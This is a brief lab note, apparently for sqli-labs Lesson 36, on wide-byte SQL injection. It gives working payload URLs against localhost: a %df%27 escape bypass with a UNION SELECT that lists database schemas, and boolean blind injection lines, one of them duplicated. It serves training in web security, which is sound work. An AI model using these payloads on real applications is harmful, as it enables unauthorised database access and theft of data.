# Lesson-36
```
明注-,-Bool盲注-,-宽字节绕过
```

明注 : 
```
http://127.0.0.1/Less-36/?id=0%df%27%20union%20select%201,1,group_concat(schema_name)%20from%20information_schema.schemata--+
```
盲注 : 
```
http://127.0.0.1/Less-36/?id=0%df%27||1--+
http://127.0.0.1/Less-36/?id=0%df%27||1--+
```
